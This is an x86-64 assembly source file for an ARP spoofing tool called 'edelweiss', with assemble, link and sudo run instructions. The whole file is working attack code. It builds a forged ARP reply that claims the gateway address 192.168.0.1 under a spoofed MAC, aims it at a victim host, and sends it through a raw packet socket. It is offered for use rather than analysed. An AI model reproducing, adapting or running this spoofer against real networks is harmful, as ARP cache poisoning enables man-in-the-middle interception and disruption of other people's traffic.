; edelweiss.asm - x64 ARP spoofing tool with interface binding
; Assemble: nasm -f elf64 edelweiss.asm -o edelweiss.o
; Link:     ld edelweiss.o -o edelweiss
; Run:      sudo ./edelweiss
; Aut:      hwollwage & hnabtje (enhanced)

BITS 64
GLOBAL _start

%define ETH_P_ALL 0x0300
%define ETH_HDR_LEN 14
%define ARP_PKT_LEN 28
%define TOTAL_LEN 42         ; 14 + 28

SECTION .data

if_name:    db "eth0", 0     ; Network interface name
eth_hdr:                      ; Ethernet header
    db 0xff,0xff,0xff,0xff,0xff,0xff    ; Destination MAC (broadcast)
    db 0xde,0xad,0xbe,0xef,0xde,0xad    ; Source MAC (spoofed)
    dw 0x0608                           ; EtherType = ARP (0x0806 LE)

arp_pkt:                      ; ARP packet (28 bytes)
    dw 0x0100                 ; Hardware type (Ethernet)
    dw 0x0008                 ; Protocol type (IPv4)
    db 6                      ; Hardware size
    db 4                      ; Protocol size
    dw 0x0200                 ; Opcode: reply
    db 0xde,0xad,0xbe,0xef,0xde,0xad    ; Sender MAC (spoofed)
    db 192,168,0,1                      ; Sender IP
    db 0xaa,0xbb,0xcc,0xdd,0xee,0xff    ; Target MAC (victim)
    db 192,168,0,100                    ; Target IP

SECTION .bss
sock_fd     resq 1
packet      resb TOTAL_LEN
sll         resb 20                    ; struct sockaddr_ll

SECTION .text

_start:

    ; Build full packet
    mov rdi, packet
    mov rsi, eth_hdr
    mov rcx, ETH_HDR_LEN
    rep movsb
    mov rsi, arp_pkt
    mov rcx, ARP_PKT_LEN
    rep movsb

    ; socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
    mov rax, 41
    mov rdi, 17         ; AF_PACKET
    mov rsi, 3          ; SOCK_RAW
    mov rdx, ETH_P_ALL  ; Protocol (ETH_P_ALL)
    syscall
    mov [sock_fd], rax

    ; prepare sockaddr_ll manually
    mov rbx, sll
    mov word [rbx], 17           ; sll_family = AF_PACKET
    mov word [rbx+2], 0x0608     ; sll_protocol = ARP (0x0806 LE)
    mov dword [rbx+4], 2         ; sll_ifindex = 2 (assumes eth0)

    ; bind(sock_fd, &sll, 20)
    mov rax, 49
    mov rdi, [sock_fd]
    mov rsi, sll
    mov rdx, 20
    syscall

    ; sendto(sock_fd, packet, TOTAL_LEN, 0, &sll, 20)
    mov rax, 44
    mov rdi, [sock_fd]
    mov rsi, packet
    mov rdx, TOTAL_LEN
    xor r10, r10         ; flags = 0
    mov r8, sll          ; dest addr
    mov r9d, 20          ; addrlen
    syscall

_exit:
    ; exit(0)
    mov rax, 60
    xor rdi, rdi
    syscall
